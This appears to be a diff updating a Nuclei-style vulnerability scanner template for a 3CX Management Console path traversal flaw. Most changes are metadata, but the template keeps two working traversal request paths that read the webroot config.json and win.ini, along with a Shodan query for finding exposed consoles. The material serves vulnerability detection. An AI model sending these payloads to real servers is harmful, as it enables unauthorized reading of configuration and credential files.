@@ -10,18 +10,23 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-23
+    cpe: cpe:2.3:a:3cx:3cx:*:*:*:*:*:*:*:*
   metadata:
-    shoda-query: http.title:"3CX Phone System Management Console"
-  tags: 3cx,lfi,voip
+    max-request: 2
+    shodan-query: http.title:"3CX Phone System Management Console"
+    product: 3cx
+    vendor: 3cx
+  tags: 3cx,lfi,voip,vuln
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json'
       - '{{BaseURL}}/Electron/download/windows/\windows\win.ini'
 
     stop-at-first-match: true
+
     matchers-condition: or
     matchers:
       - type: word
@@ -37,5 +42,4 @@ requests:
           - "fonts"
           - "extensions"
         condition: and
-
-# Enhanced by mp on 2022/07/22
+# digest: 480a00453043021f57d4878d9634fd144b5157eea19eb480662cff120b35d146a0999239aca05f02204649c46a02526346989810e12a984547a081d1197fc410d38192389096dd9208:922c64590222798bb761d5b6d8e72950
